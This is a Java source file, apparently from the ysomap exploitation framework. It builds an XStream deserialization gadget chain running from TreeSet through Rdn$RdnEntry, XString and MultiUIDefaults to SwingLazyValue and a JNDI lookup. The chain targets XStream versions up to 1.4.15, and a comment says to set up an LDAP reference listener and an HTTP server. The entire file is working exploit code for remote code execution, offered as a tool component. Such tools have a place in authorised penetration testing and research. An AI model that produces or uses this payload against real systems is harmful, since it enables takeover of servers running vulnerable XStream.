package ysomap.core.payload.xstream;

import com.sun.org.apache.xpath.internal.objects.XString;
import sun.swing.SwingLazyValue;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.SwingLazyValueBullet;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import javax.swing.*;

/**
 * gadget chain
 * TreeSet.put
 * javax.naming.ldap.Rdn$RdnEntry.compareTo
 *     com.sun.org.apache.xpath.internal.objects.XString.equal
 *         javax.swing.MultiUIDefaults.toString
 *             UIDefaults.get
 *                 UIDefaults.getFromHashTable
 *                     UIDefaults$LazyValue.createValue
 *                     SwingLazyValue.createValue
 *                         javax.naming.InitialContext.doLookup()
 *
 * setup a LDAPRefListener & SimpleHTTPServer
 * @author wh1t3P1g
 * @since 2021/1/4
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Dependencies({"Gadget For XStream","<=com.thoughtworks.xstream:xstream:1.4.15"})
@Require(bullets = {"SwingLazyValueBullet"}, param = false)
public class LazyValue extends Payload<Object> {
    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        Bullet bullet =  new SwingLazyValueBullet();
        bullet.set("jndiURL",command);
        return bullet;
    }

    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("xstream");
    }

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof SwingLazyValue;
    }

    @Override
    public Object pack(Object obj) throws Exception {
        UIDefaults uiDefaults = new UIDefaults();
        Object multiUIDefaults =
                ReflectionHelper.newInstance("javax.swing.MultiUIDefaults", new Object[]{new UIDefaults[]{uiDefaults}});
        uiDefaults.put("lazyValue", obj);

        Object rdnEntry1 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        ReflectionHelper.setFieldValue(rdnEntry1, "type", "ysomap");
        ReflectionHelper.setFieldValue(rdnEntry1, "value", new XString("test"));

        Object rdnEntry2 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        ReflectionHelper.setFieldValue(rdnEntry2, "type", "ysomap");
        ReflectionHelper.setFieldValue(rdnEntry2, "value", multiUIDefaults);

        return PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);
    }

}
